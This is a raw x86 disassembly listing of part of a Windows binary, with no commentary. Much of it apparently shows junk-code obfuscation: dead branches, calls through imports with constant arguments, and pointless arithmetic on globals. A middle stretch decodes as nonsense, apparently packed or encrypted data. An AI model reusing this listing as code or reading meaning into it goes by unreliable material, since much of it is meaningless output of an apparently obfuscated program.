  41ef3b:	add    edi,DWORD PTR [eax]
  41ef3d:	idiv   BYTE PTR [ebp-0x626e2ed8]
  41ef43:	mov    WORD PTR [esi],ss
  41ef45:	ins    BYTE PTR es:[edi],dx
  41ef46:	xchg   ebx,eax
  41ef47:	dec    eax
  41ef48:	lahf   
  41ef49:	sbb    eax,0xeb18024e
  41ef4e:	mov    eax,DWORD PTR [ebp-0x4c]
  41ef51:	adc    DWORD PTR ds:0x42814f,0x3493
  41ef5b:	add    eax,DWORD PTR [ebp-0xb4]
  41ef61:	xor    edx,0x29c
  41ef67:	xor    eax,0x2e02
  41ef6c:	sbb    ecx,ecx
  41ef6e:	xor    eax,0x7294
  41ef73:	movzx  edx,WORD PTR ds:0x428273
  41ef7a:	sbb    DWORD PTR ds:0x42814f,edx
  41ef80:	imul   eax,eax,0x68f3
  41ef86:	and    DWORD PTR ds:0x428167,edi
  41ef8c:	mov    ecx,DWORD PTR [ebp-0x8c]
  41ef92:	cmp    DWORD PTR ds:0x4282db,0x0
  41ef99:	mov    edx,0x254
  41ef9e:	mov    edx,0x254c
  41efa3:	mov    edx,0x6b4f
  41efa8:	jmp    0x41f000
  41efad:	mov    DWORD PTR ds:0x4282cb,0x78fa
  41efb7:	cmp    DWORD PTR ds:0x4282db,0x0
  41efbe:	jb     0x41efe4
  41efc4:	push   DWORD PTR [ebp-0x1c]
  41efc7:	push   0x74cd
  41efcc:	push   0x4a2f
  41efd1:	call   DWORD PTR ds:0x428dfc
  41efd7:	sub    edx,DWORD PTR ds:0x42820f
  41efdd:	inc    edx
  41efde:	and    edx,DWORD PTR ds:0x42822b
  41efe4:	mov    DWORD PTR ds:0x428373,0x703b
  41efee:	and    edx,DWORD PTR ds:0x42821b
  41eff4:	xor    edx,DWORD PTR ds:0x428287
  41effa:	and    DWORD PTR ds:0x428387,edx
  41f000:	and    eax,ecx
  41f002:	sub    eax,0x2818
  41f007:	mov    DWORD PTR [ebp-0xe8],eax
  41f00d:	jmp    0x41f369
  41f012:	adc    al,0x29
  41f015:	fstp   DWORD PTR [ebx]
  41f017:	and    BYTE PTR [edx+0x3a],ah
  41f01a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f01b:	repz mov ebx,0x476388b0
  41f021:	push   0xffffff99
  41f023:	sub    DWORD PTR [esi],edx
  41f025:	sbb    BYTE PTR [ebx-0xe7e7ee],ah
  41f02b:	shl    BYTE PTR ss:[esi],cl
  41f02e:	inc    edx
  41f02f:	shr    BYTE PTR [edi-0x4e],0x62
  41f033:	dec    edx
  41f034:	or     eax,0xaa53c5fe
  41f039:	out    dx,eax
  41f03a:	mov    edi,0x93cc4f30
  41f03f:	jge    0x41f0a3
  41f041:	xchg   ecx,eax
  41f042:	jne    0x41f05e
  41f044:	es jmp 0xacb0d7c6
  41f04a:	rol    DWORD PTR [esi+0x70bfd5b2],0xcb
  41f051:	in     eax,0x53
  41f053:	sub    esi,ebp
  41f055:	cld    
  41f056:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f057:	cmp    BYTE PTR [ebx],bl
  41f059:	push   edi
  41f05a:	inc    esp
  41f05b:	push   ecx
  41f05c:	adc    ah,dh
  41f05e:	test   BYTE PTR [eax+0x28],0x57
  41f062:	mov    ebp,0x67ff6ad6
  41f067:	inc    edi
  41f068:	ror    DWORD PTR [ebx],cl
  41f06a:	sbb    eax,0xbeff67d3
  41f06f:	stc    
  41f070:	mov    eax,ds:0x68f35811
  41f075:	ficomp WORD PTR [ebx]
  41f077:	pop    esi
  41f078:	lods   al,BYTE PTR ds:[esi]
  41f079:	pop    eax
  41f07a:	mov    dl,dh
  41f07c:	daa    
  41f07d:	mov    cl,0x17
  41f07f:	ins    DWORD PTR es:[edi],dx
  41f080:	in     eax,dx
  41f081:	pop    ecx
  41f082:	mov    al,ds:0x8852d70c
  41f087:	add    BYTE PTR [ebx],dl
  41f089:	outs   dx,BYTE PTR ds:[esi]
  41f08a:	xor    al,0xe
  41f08c:	leave  
  41f08d:	jmp    0xdc09c8a0
  41f092:	inc    edi
  41f093:	xor    al,0x41
  41f095:	aaa    
  41f096:	jge    0x41f10c
  41f098:	scas   al,BYTE PTR es:[edi]
  41f099:	add    eax,0x1e043a08
  41f09e:	pop    ebp
  41f09f:	dec    eax
  41f0a0:	xchg   ecx,eax
  41f0a1:	enter  0x5a92,0x64
  41f0a5:	mov    esp,0x1b38131e
  41f0aa:	in     al,dx
  41f0ab:	push   0x98d8dcc3
  41f0b0:	fstp   DWORD PTR [esi+0x66f5e01c]
  41f0b6:	sub    DWORD PTR [edi-0x504e8906],ebx
  41f0bc:	inc    edi
  41f0bd:	das    
  41f0be:	rcr    al,1
  41f0c0:	cmp    BYTE PTR [ebp*4+0x1d2528e9],bl
  41f0c7:	pop    eax
  41f0c8:	fisubr WORD PTR [ebx-0x25]
  41f0cb:	inc    edi
  41f0cc:	push   es
  41f0cd:	clc    
  41f0ce:	stc    
  41f0cf:	xchg   edi,eax
  41f0d0:	adc    BYTE PTR [esi+eax*1],al
  41f0d3:	scas   eax,DWORD PTR es:[edi]
  41f0d4:	cdq    
  41f0d5:	and    BYTE PTR [esi],0x6f
  41f0d8:	or     esi,ecx
  41f0da:	push   esp
  41f0db:	or     esp,edi
  41f0dd:	mov    ebx,0x1b1c73e3
  41f0e2:	push   0xd366d360
  41f0e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0e8:	jp     0x41f0d4
  41f0ea:	in     eax,dx
  41f0eb:	dec    ecx
  41f0ec:	mov    esp,0x374e1027
  41f0f1:	sbb    eax,0xc52b111b
  41f0f6:	inc    ebp
  41f0f7:	cld    
  41f0f8:	mov    ds:0xde408b3a,eax
  41f0fd:	jmp    0xf759031c
  41f102:	xchg   edx,eax
  41f103:	imul   eax
  41f105:	cld    
  41f106:	pop    es
  41f107:	sti    
  41f108:	or     eax,0x3b1a2df7
  41f10d:	cmp    BYTE PTR [ebp+0x5e],al
  41f110:	daa    
  41f111:	xlat   BYTE PTR ds:[ebx]
  41f112:	inc    edx
  41f113:	sti    
  41f114:	inc    edi
  41f115:	and    DWORD PTR ds:0xc794cc33,0xffffffe3
  41f11c:	nop
  41f11d:	push   ecx
  41f11e:	xchg   esp,eax
  41f11f:	mov    ds:0x864c24e7,eax
  41f124:	lahf   
  41f125:	mov    bh,0xbc
  41f127:	loop   0x41f0ad
  41f129:	and    BYTE PTR [esi+0x4c],0x97
  41f12d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f12e:	out    0x47,al
  41f130:	xchg   ebx,eax
  41f131:	(bad)  
  41f132:	mov    eax,ds:0xccc2af29
  41f137:	add    al,0xac
  41f139:	adc    DWORD PTR [ecx+0x5db6739d],ecx
  41f13f:	and    edx,DWORD PTR [edi-0x76]
  41f142:	mov    ?,WORD PTR [ebx+esi*1+0x6cb242e9]
  41f149:	hlt    
  41f14a:	inc    esp
  41f14b:	xlat   BYTE PTR ds:[ebx]
  41f14c:	xor    DWORD PTR [ebp-0x36214aa9],ebp
  41f152:	mov    ds:0x5be3feb9,eax
  41f157:	aad    0x5d
  41f159:	push   ecx
  41f15a:	call   0x1e1f:0xacb67cb
  41f161:	fcom   st(7)
  41f163:	sti    
  41f164:	in     eax,dx
  41f165:	nop
  41f166:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f167:	aaa    
  41f168:	mov    ds:0x596de2e2,eax
  41f16d:	leave  
  41f16e:	jmp    0x41f125
  41f170:	arpl   WORD PTR [ecx-0x64],si
  41f173:	scas   al,BYTE PTR es:[edi]
  41f174:	mov    bl,0x56
  41f176:	cwde   
  41f177:	aam    0x8a
  41f179:	sbb    dh,BYTE PTR [edx+ebp*4+0x3]
  41f17d:	ds pop esp
  41f17f:	push   ss
  41f180:	daa    
  41f181:	push   esp
  41f182:	cld    
  41f183:	jmp    0x41f1fb
  41f185:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f186:	sbb    al,0x25
  41f188:	mov    ah,0x43
  41f18a:	fiadd  DWORD PTR [edx]
  41f18c:	pop    ebp
  41f18d:	std    
  41f18e:	sub    eax,0x28ec066a
  41f193:	je     0x41f1ea
  41f195:	je     0x41f1e0
  41f197:	sub    BYTE PTR [eax-0x3e],bl
  41f19a:	push   ecx
  41f19b:	mov    ebp,0xab4996e8
  41f1a0:	stos   BYTE PTR es:[edi],al
  41f1a1:	ss std 
  41f1a3:	jmp    FWORD PTR [edx]
  41f1a5:	loope  0x41f1fd
  41f1a7:	stos   BYTE PTR es:[edi],al
  41f1a8:	jmp    0xf983:0x57115fb9
  41f1af:	pop    es
  41f1b0:	jle    0x41f165
  41f1b2:	in     eax,0xd0
  41f1b4:	mov    eax,ds:0x7d9b1a22
  41f1b9:	xchg   edi,eax
  41f1ba:	xor    BYTE PTR [edx+eiz*2+0x49],dl
  41f1be:	nop
  41f1bf:	shl    BYTE PTR [edi-0x65],cl
  41f1c2:	jbe    0x41f21f
  41f1c4:	jle    0x41f185
  41f1c6:	(bad)  
  41f1c8:	stos   DWORD PTR es:[edi],eax
  41f1c9:	pop    ds
  41f1ca:	push   es
  41f1cb:	call   0x2882:0xe2115f17
  41f1d2:	call   0x60359fd0
  41f1d7:	sar    BYTE PTR [ecx],1
  41f1d9:	or     al,0xe2
  41f1db:	mov    ebx,0xdb02e552
  41f1e0:	xchg   edx,eax
  41f1e1:	leave  
  41f1e2:	jbe    0x41f1c7
  41f1e4:	nop
  41f1e5:	sbb    eax,0x33cf2774
  41f1ea:	pop    edx
  41f1eb:	cmp    al,BYTE PTR [ebp+0xcfb90fa]
  41f1f1:	test   DWORD PTR [ebx],ebx
  41f1f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1f4:	add    cl,BYTE PTR [esi+0x6e]
  41f1f7:	retf   0xc866
  41f1fa:	mov    ?,WORD PTR [edx+0x73bda5be]
  41f200:	inc    ebp
  41f201:	out    dx,eax
  41f202:	sub    al,0x1a
  41f204:	sub    bl,bl
  41f206:	xchg   ecx,eax
  41f207:	pop    edi
  41f208:	or     eax,0x11e9571
  41f20d:	push   edi
  41f20e:	jge    0x41f22b
  41f210:	xchg   ebp,eax
  41f211:	add    eax,0x5b1edc3a
  41f216:	sbb    bh,cl
  41f218:	mov    edi,0x6676591e
  41f21d:	inc    ebp
  41f21e:	rol    BYTE PTR [ebx+eax*1+0xa],0xfa
  41f223:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f224:	pop    ds
  41f225:	mov    edi,0x7aceb4a9
  41f22a:	adc    edi,ebx
  41f22c:	ss aas 
  41f22e:	jmp    0xd262:0x8a813163
  41f235:	jle    0x41f27c
  41f237:	clc    
  41f238:	cmp    eax,0xaca1d616
  41f23d:	push   edi
  41f23e:	mov    BYTE PTR [eax+0x52ac81be],bl
  41f244:	inc    ecx
  41f245:	sbb    cl,BYTE PTR [ebx]
  41f247:	jmp    0x41f209
  41f249:	mov    BYTE PTR [eax+0x6e4cd34b],ch
  41f24f:	icebp  
  41f250:	lds    ebp,FWORD PTR [ebx+ebp*1+0x15e1ed01]
  41f257:	dec    esi
  41f258:	clc    
  41f259:	pushf  
  41f25a:	inc    esi
  41f25b:	ss push ds
  41f25d:	pop    ebp
  41f25e:	dec    esp
  41f25f:	dec    ebp
  41f260:	mov    BYTE PTR [edx+0x739e4e64],cl
  41f266:	or     BYTE PTR [ecx],0xe4
  41f269:	jle    0x41f2a8
  41f26b:	add    al,0xcd
  41f26d:	mov    ds:0xcf94b75e,eax
  41f272:	jnp    0x41f2a0
  41f274:	sub    al,0x21
  41f276:	inc    edx
  41f277:	mov    DWORD PTR [edi+0x16],ebp
  41f27a:	bound  eax,QWORD PTR [ecx+0x39a4c4bd]
  41f280:	ins    BYTE PTR es:[edi],dx
  41f281:	jmp    0x77eb320b
  41f286:	out    0xd8,al
  41f288:	lods   eax,DWORD PTR ds:[esi]
  41f289:	adc    DWORD PTR [ebx],esi
  41f28b:	xor    al,0xa5
  41f28d:	bound  edx,QWORD PTR [eax]
  41f28f:	pop    ecx
  41f290:	push   edx
  41f291:	cmp    al,0x1f
  41f293:	fcomp  DWORD PTR [ecx+0x36fa3dd0]
  41f299:	(bad)  
  41f29a:	mov    ch,0xf7
  41f29c:	xor    ebx,ebx
  41f29e:	mov    ebx,DWORD PTR [esi+0x1]
  41f2a1:	sbb    cl,ch
  41f2a3:	test   eax,0x3f5f8d04
  41f2a8:	cmp    eax,0x1841cde0
  41f2ad:	xchg   edi,eax
  41f2ae:	lahf   
  41f2af:	ficom  DWORD PTR [edx-0xf60143b]
  41f2b5:	and    DWORD PTR [edx],edx
  41f2b7:	inc    esp
  41f2b8:	pop    esi
  41f2b9:	(bad)  
  41f2ba:	lock jle 0x41f2ac
  41f2bd:	sub    BYTE PTR [edx+0x46616680],al
  41f2c3:	add    DWORD PTR [ebp-0x74266195],0xffffffb1
  41f2ca:	fwait
  41f2cb:	mov    ch,0x48
  41f2cd:	dec    edx
  41f2ce:	add    dl,bh
  41f2d0:	ins    BYTE PTR es:[edi],dx
  41f2d1:	pop    ecx
  41f2d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2d3:	repnz or dh,BYTE PTR [ebx]
  41f2d6:	mov    al,ds:0x4d611694
  41f2db:	mov    bl,0x21
  41f2dd:	fist   WORD PTR [edx-0x2ed45dda]
  41f2e3:	and    bl,BYTE PTR [ebp+0x5f]
  41f2e6:	(bad)  
  41f2e7:	call   0x2f990037
  41f2ec:	out    0x75,eax
  41f2ee:	test   eax,0xc43b2b9a
  41f2f3:	and    eax,0x21bbb6e7
  41f2f8:	jmp    0x41f316
  41f2fa:	jecxz  0x41f2d5
  41f2fc:	popa   
  41f2fd:	jle    0x41f2fd
  41f2ff:	(bad)  
  41f300:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f301:	in     al,0x20
  41f303:	ficom  DWORD PTR [esi+ebp*1+0x556646b8]
  41f30a:	push   ds
  41f30b:	gs into 
  41f30d:	mov    dh,0xb6
  41f30f:	pop    esp
  41f310:	adc    eax,0xc4bbaf9b
  41f315:	xor    eax,0xced928eb
  41f31a:	ins    DWORD PTR es:[edi],dx
  41f31b:	jg     0x41f31d
  41f31d:	or     al,0xa4
  41f31f:	jno    0x41f338
  41f321:	sahf   
  41f322:	cmp    bh,BYTE PTR [ebx]
  41f324:	jnp    0x41f395
  41f326:	loope  0x41f2af
  41f328:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f329:	fsub   QWORD PTR [ebp-0x45]
  41f32c:	repz rol DWORD PTR [edx-0x680da909],cl
  41f333:	adc    eax,0x386f5e0b
  41f338:	xchg   ebx,eax
  41f339:	das    
  41f33a:	pop    ebp
  41f33b:	fdivr  DWORD PTR [ebx+0x4ed3be5b]
  41f341:	pushf  
  41f342:	sub    dh,bl
  41f344:	push   es
  41f345:	sub    cl,ah
  41f347:	sub    al,0x1
  41f349:	fsubp  st(4),st
  41f34b:	cmp    eax,0xa40dfd1
  41f350:	es ja  0x41f354
  41f353:	pop    ds
  41f354:	mov    eax,0x3091eece
  41f359:	mov    ecx,0x8bb2541e
  41f35e:	call   0x4cf8c8a3
  41f363:	nop
  41f364:	aad    0x23
  41f366:	jnp    0x41f31e
  41f368:	sub    bh,al
  41f36a:	inc    ebp
  41f36b:	nop
  41f36c:	mov    DWORD PTR [edi+0x0],ebp
  41f36f:	add    BYTE PTR [ebx+0x4282f33d],al
  41f375:	add    BYTE PTR [eax],al
  41f377:	movzx  edx,WORD PTR ds:0x42820f
  41f37e:	mov    ecx,DWORD PTR ds:0x428257
  41f384:	mov    ecx,DWORD PTR ds:0x428243
  41f38a:	jmp    0x41f3f3
  41f38f:	not    eax
  41f391:	mov    DWORD PTR ds:0x42822f,ebx
  41f397:	cmp    DWORD PTR ds:0x4282f3,0x0
  41f39e:	jbe    0x41f3dd
  41f3a4:	push   DWORD PTR [ebp-0x14]
  41f3a7:	push   DWORD PTR [ebp-0x28]
  41f3aa:	push   DWORD PTR [ebp-0x10]
  41f3ad:	push   0x428103
  41f3b2:	push   0x1cee
  41f3b7:	push   0x479c
  41f3bc:	push   0x8744
  41f3c1:	call   DWORD PTR ds:0x428e00
  41f3c7:	sub    ecx,DWORD PTR ds:0x428227
  41f3cd:	mov    DWORD PTR ds:0x428177,0x2f55
  41f3d7:	and    DWORD PTR ds:0x4282d3,ebx
  41f3dd:	or     DWORD PTR ds:0x4282eb,ecx
  41f3e3:	xor    edx,edx
  41f3e5:	or     edx,DWORD PTR ds:0x42817f
  41f3eb:	mov    edx,DWORD PTR [edx]
  41f3ed:	sbb    DWORD PTR ds:0x428307,edx
  41f3f3:	mov    DWORD PTR [ebp-0xd0],0x5a58
  41f3fd:	mov    DWORD PTR [ebp-0x120],0x3c77
  41f407:	mov    DWORD PTR [ebp-0x2c],0x2129
  41f40e:	or     DWORD PTR ds:0x42815f,0x8a7
  41f418:	mov    eax,DWORD PTR [ebp-0x2c]
  41f41b:	imul   eax,eax,0x1ada
  41f421:	cmp    DWORD PTR ds:0x42836b,0x0
  41f428:	mov    DWORD PTR ds:0x4282ff,0xae0
  41f432:	mov    DWORD PTR ds:0x42813b,ebx
  41f438:	mov    ecx,DWORD PTR ds:0x42835b
  41f43e:	jmp    0x41f484
  41f443:	mov    DWORD PTR ds:0x4282e3,ebx
  41f449:	mov    DWORD PTR ds:0x42815f,0x2430
  41f453:	cmp    DWORD PTR ds:0x42836b,0x0
  41f45a:	ja     0x41f47c
  41f460:	push   DWORD PTR [ebp-0x18]
  41f463:	push   0x427f15
  41f468:	call   DWORD PTR ds:0x428e84
  41f46e:	sub    ecx,0x6218
  41f474:	inc    DWORD PTR ds:0x428377
  41f47a:	add    edx,edx
  41f47c:	or     edx,ecx
  41f47e:	sub    edx,0x9ad
  41f484:	mov    ecx,DWORD PTR [ebp-0x120]
  41f48a:	cmp    DWORD PTR ds:0x428177,0x0
  41f491:	not    edx
  41f493:	mov    DWORD PTR ds:0x4282cf,0x6486
  41f49d:	mov    DWORD PTR ds:0x42823b,0x7a92
  41f4a7:	mov    DWORD PTR ds:0x42826b,ebx
  41f4ad:	jmp    0x41f510
  41f4b2:	mov    DWORD PTR ds:0x428373,0x24a4
  41f4bc:	cmp    DWORD PTR ds:0x428177,0x0
  41f4c3:	ja     0x41f4ed
  41f4c9:	push   0x427fdb
  41f4ce:	push   DWORD PTR [ebp-0x10]
  41f4d1:	call   DWORD PTR ds:0x428e04
  41f4d7:	neg    DWORD PTR ds:0x42816b
  41f4dd:	and    DWORD PTR ds:0x42824f,0x4282d3
  41f4e7:	and    DWORD PTR ds:0x42834f,edi
  41f4ed:	movzx  edx,BYTE PTR ds:0x428167
  41f4f4:	sbb    edx,DWORD PTR ds:0x4282ef
  41f4fa:	mov    DWORD PTR ds:0x428167,edx
  41f500:	sub    DWORD PTR ds:0x428263,0x2ffe
  41f50a:	and    edx,0x4c8b
  41f510:	imul   ecx,ecx,0x53ae
  41f516:	and    DWORD PTR ds:0x42816f,ebx
  41f51c:	imul   ecx,ecx,0x7447
  41f522:	mov    edx,DWORD PTR [ebp-0xd0]
  41f528:	sbb    DWORD PTR ds:0x428373,0x1933
  41f532:	and    ecx,edx
  41f534:	cmp    DWORD PTR ds:0x428153,0x0
  41f53b:	mov    DWORD PTR ds:0x42836f,0x38cb
  41f545:	mov    edx,0x66af
  41f54a:	not    edx
  41f54c:	jmp    0x41f5db
  41f551:	mov    DWORD PTR ds:0x42822f,0x6044
  41f55b:	not    DWORD PTR ds:0x42823b
  41f561:	cmp    DWORD PTR ds:0x428153,0x0
  41f568:	jg     0x41f5a9
  41f56e:	push   0x13fa
  41f573:	push   DWORD PTR [ebp-0x18]
  41f576:	push   0x47c2
  41f57b:	push   DWORD PTR [ebp-0x1c]
  41f57e:	push   0x5b80
  41f583:	push   DWORD PTR [ebp-0x10]
  41f586:	push   0x6360
  41f58b:	push   0x2aad
  41f590:	push   DWORD PTR [ebp-0x28]
  41f593:	push   DWORD PTR [ebp-0x10]
  41f596:	call   DWORD PTR ds:0x428e08
  41f59c:	inc    edx
  41f59d:	adc    DWORD PTR ds:0x428133,edi
  41f5a3:	and    DWORD PTR ds:0x4282cb,ecx
  41f5a9:	movzx  edx,WORD PTR ds:0x4282e3
  41f5b0:	add    edx,DWORD PTR ds:0x4282db
  41f5b6:	mov    DWORD PTR ds:0x4282e3,edx
  41f5bc:	add    DWORD PTR ds:0x4282d7,0x7749
  41f5c6:	adc    DWORD PTR ds:0x42823b,0x1ba
  41f5d0:	dec    edx
  41f5d1:	sub    DWORD PTR ds:0x42836f,0x6520
  41f5db:	or     ecx,0x2a20
  41f5e1:	mov    DWORD PTR ds:0x42817b,0x1cbf
  41f5eb:	mov    edx,DWORD PTR [ebp-0x70]
  41f5ee:	adc    DWORD PTR ds:0x4282ff,0x2406
  41f5f8:	xor    ecx,edx
  41f5fa:	or     DWORD PTR ds:0x4282ef,ecx
  41f600:	mov    edx,DWORD PTR [ebp+0x14]
  41f603:	adc    DWORD PTR ds:0x428373,0x652b
  41f60d:	mov    eax,DWORD PTR [edx+eax*1-0x37a66ea]
  41f614:	xor    DWORD PTR ds:0x428237,0x49e9
  41f61e:	lea    eax,[ecx+eax*1-0x45a1]
  41f625:	cmp    DWORD PTR ds:0x42824b,0x0
  41f62c:	mov    ecx,0x2e1f
  41f631:	mov    DWORD PTR ds:0x428267,ecx
  41f637:	mov    ecx,0x173d
  41f63c:	not    DWORD PTR ds:0x428233
  41f642:	jmp    0x41f698
  41f647:	mov    DWORD PTR ds:0x42827f,0x35b0
  41f651:	cmp    DWORD PTR ds:0x42824b,0x0
  41f658:	jae    0x41f680
  41f65e:	push   0x2832
  41f663:	call   DWORD PTR ds:0x428e0c
  41f669:	dec    ecx
  41f66a:	or     DWORD PTR ds:0x42820b,0x127d
  41f674:	mov    ecx,DWORD PTR ds:0x4282d7
  41f67a:	add    DWORD PTR ds:0x4282fb,ecx
  41f680:	sbb    DWORD PTR ds:0x42826f,ebx
  41f686:	mov    ecx,DWORD PTR ds:0x428143
  41f68c:	adc    DWORD PTR ds:0x428137,ecx
  41f692:	and    ecx,0x3d62
  41f698:	mov    DWORD PTR [ebp-0xb0],eax
  41f69e:	mov    ecx,DWORD PTR ds:0x42839f
  41f6a4:	mov    ecx,DWORD PTR [ecx]
  41f6a6:	xor    DWORD PTR ds:0x42822f,ecx
  41f6ac:	mov    DWORD PTR [ebp-0x11c],0x303f
  41f6b6:	not    eax
  41f6b8:	mov    DWORD PTR [ebp-0x98],0x51a9
  41f6c2:	sub    DWORD PTR ds:0x428303,0x1cf2
  41f6cc:	mov    DWORD PTR [ebp-0xcc],0x6d4d
  41f6d6:	xor    eax,ecx
  41f6d8:	mov    eax,DWORD PTR [ebp-0xcc]
  41f6de:	cmp    DWORD PTR ds:0x4282e7,0x0
  41f6e5:	mov    DWORD PTR ds:0x4282ef,0x6375
  41f6ef:	not    DWORD PTR ds:0x42814f
  41f6f5:	mov    DWORD PTR ds:0x42820b,ecx
  41f6fb:	jmp    0x41f76f
  41f700:	mov    DWORD PTR ds:0x42821b,0x2351
  41f70a:	mov    DWORD PTR ds:0x42825f,ebx
  41f710:	cmp    DWORD PTR ds:0x4282e7,0x0
  41f717:	jb     0x41f758
  41f71d:	push   0x3851
  41f722:	push   0x42824b
  41f727:	call   DWORD PTR ds:0x428e10
  41f72d:	movzx  ecx,WORD PTR ds:0x42821b
  41f734:	xor    DWORD PTR ds:0x428387,ecx
  41f73a:	mov    ecx,DWORD PTR ds:0x42824b
  41f740:	add    ecx,DWORD PTR ds:0x428243
  41f746:	mov    DWORD PTR ds:0x42824b,ecx
  41f74c:	mov    ecx,DWORD PTR ds:0x42825b
  41f752:	adc    DWORD PTR ds:0x42836b,ecx
  41f758:	inc    ecx
  41f759:	xor    DWORD PTR ds:0x428307,ebx
  41f75f:	sub    DWORD PTR ds:0x428167,edx
  41f765:	and    DWORD PTR ds:0x4282e7,0x3308
  41f76f:	xor    eax,0x6f65
  41f774:	add    DWORD PTR ds:0x4282fb,edx
  41f77a:	mov    ecx,DWORD PTR [ebp-0x98]
  41f780:	add    DWORD PTR ds:0x428367,0x4282db
  41f78a:	or     eax,ecx
  41f78c:	and    DWORD PTR ds:0x428217,0x3807
  41f796:	add    eax,0x161e
  41f79b:	or     ecx,DWORD PTR ds:0x428227
  41f7a1:	mov    ecx,DWORD PTR [ebp-0x11c]
  41f7a7:	add    DWORD PTR ds:0x42821b,0x428177
  41f7b1:	or     eax,ecx
  41f7b3:	add    DWORD PTR ds:0x428367,edi
  41f7b9:	add    eax,0x1cca
  41f7be:	or     ecx,DWORD PTR ds:0x428267
  41f7c4:	xor    eax,0x96c9
  41f7c9:	mov    DWORD PTR [ebp-0x38],eax
  41f7cc:	cmp    DWORD PTR ds:0x428373,0x0
  41f7d3:	mov    ecx,DWORD PTR ds:0x428357
  41f7d9:	mov    DWORD PTR ds:0x42834b,ecx
  41f7df:	mov    DWORD PTR ds:0x4282ef,0x7d57
  41f7e9:	jmp    0x41f8c3
  41f7ee:	mov    DWORD PTR ds:0x42826f,0xe1
  41f7f8:	mov    DWORD PTR ds:0x428167,edi
  41f7fe:	cmp    DWORD PTR ds:0x428373,0x0
  41f805:	jne    0x41f836
  41f80b:	push   DWORD PTR [ebp-0xc]
  41f80e:	push   0x427f5a
  41f813:	push   0x427ec1
  41f818:	call   DWORD PTR ds:0x428e88
  41f81e:	sub    ecx,ecx
  41f820:	xor    ecx,ecx
  41f822:	add    ecx,DWORD PTR ds:0x42839b
  41f828:	mov    ecx,DWORD PTR [ecx]
  41f82a:	add    DWORD PTR ds:0x428257,ecx
  41f830:	adc    DWORD PTR ds:0x42813f,edi
  41f836:	and    DWORD PTR ds:0x42837f,0x3101
  41f840:	mov    DWORD PTR ds:0x428387,0x28b7
  41f84a:	cmp    DWORD PTR ds:0x42814f,0x0
  41f851:	mov    ecx,DWORD PTR ds:0x42823f
  41f857:	mov    DWORD PTR ds:0x42822b,0x4504
  41f861:	mov    DWORD PTR ds:0x42835f,0x3c46
  41f86b:	mov    ecx,DWORD PTR ds:0x428383
  41f871:	jmp    0x41f8c3
  41f876:	mov    DWORD PTR ds:0x4282ef,ebx
  41f87c:	cmp    DWORD PTR ds:0x42814f,0x0
  41f883:	jge    0x41f8b3
  41f889:	push   0x1
  41f88b:	push   0x427f8c
  41f890:	push   0x427f96
  41f895:	call   DWORD PTR ds:0x428e8c
  41f89b:	and    DWORD PTR ds:0x428167,ebx
  41f8a1:	add    ecx,ecx
  41f8a3:	adc    DWORD PTR ds:0x4282ef,0x1bb
  41f8ad:	and    ecx,DWORD PTR ds:0x428383
  41f8b3:	sub    ecx,0x5232
  41f8b9:	sub    DWORD PTR ds:0x428157,0x6c90
  41f8c3:	mov    DWORD PTR [ebp-0x118],0x6083
  41f8cd:	or     DWORD PTR ds:0x428247,ebx
  41f8d3:	mov    DWORD PTR [ebp-0x88],0x556
  41f8dd:	mov    DWORD PTR [ebp-0x140],0x6c7d
  41f8e7:	mov    eax,DWORD PTR [ebp-0x140]
  41f8ed:	add    eax,0x5af8
  41f8f2:	xor    DWORD PTR ds:0x42835b,0x37e5
  41f8fc:	mov    ecx,DWORD PTR [ebp-0x88]
  41f902:	sub    DWORD PTR ds:0x428143,0x42837f
  41f90c:	sub    eax,ecx
  41f90e:	dec    DWORD PTR ds:0x428257
  41f914:	mov    ecx,DWORD PTR [ebp-0x118]
  41f91a:	lea    eax,[eax+ecx*1+0x68dc]
  41f921:	or     eax,0x52f6
  41f926:	adc    ecx,DWORD PTR ds:0x42820f
  41f92c:	sub    eax,0x1dbfe
  41f931:	mov    DWORD PTR [ebp-0xac],eax
  41f937:	cmp    DWORD PTR ds:0x4282d3,0x0
  41f93e:	mov    DWORD PTR ds:0x4282e3,0x63c0
  41f948:	mov    DWORD PTR ds:0x428173,0x2316
  41f952:	mov    ecx,0x40fd
  41f957:	jmp    0x41f99f
  41f95c:	mov    eax,ds:0x42827f
  41f961:	mov    eax,0x5fd6
  41f966:	cmp    DWORD PTR ds:0x4282d3,0x0
  41f96d:	je     0x41f98d
  41f973:	call   DWORD PTR ds:0x428e90
  41f979:	sbb    DWORD PTR ds:0x428383,0x209
  41f983:	xor    DWORD PTR ds:0x428373,0x72db
  41f98d:	add    ecx,ecx
  41f98f:	and    DWORD PTR ds:0x42826f,0x6064
  41f999:	or     ecx,0x4aaa
  41f99f:	mov    DWORD PTR [ebp-0x6c],0x4b56
  41f9a6:	mov    DWORD PTR [ebp-0x100],0x49f7
  41f9b0:	xor    ecx,eax
  41f9b2:	mov    eax,DWORD PTR [ebp-0x100]
  41f9b8:	movzx  ecx,WORD PTR ds:0x428173
  41f9bf:	or     DWORD PTR ds:0x42835f,ecx
  41f9c5:	add    eax,0x7b60
  41f9ca:	cmp    DWORD PTR ds:0x4282d7,0x0
  41f9d1:	mov    DWORD PTR ds:0x42821b,0x756d
  41f9db:	mov    DWORD PTR ds:0x4282d3,0x1d60
  41f9e5:	jmp    0x41fa41
  41f9ea:	mov    ecx,DWORD PTR ds:0x4282db
  41f9f0:	cmp    DWORD PTR ds:0x4282d7,0x0
  41f9f7:	jg     0x41fa21
  41f9fd:	push   0x59e0
  41fa02:	call   DWORD PTR ds:0x428e14
  41fa08:	adc    DWORD PTR ds:0x42836f,ebx
  41fa0e:	sbb    DWORD PTR ds:0x4282f3,ebx
  41fa14:	movzx  ecx,WORD PTR ds:0x42834b
  41fa1b:	add    DWORD PTR ds:0x42835b,ecx
  41fa21:	add    DWORD PTR ds:0x428353,0x77eb
  41fa2b:	or     DWORD PTR ds:0x4282d3,0x2dfb
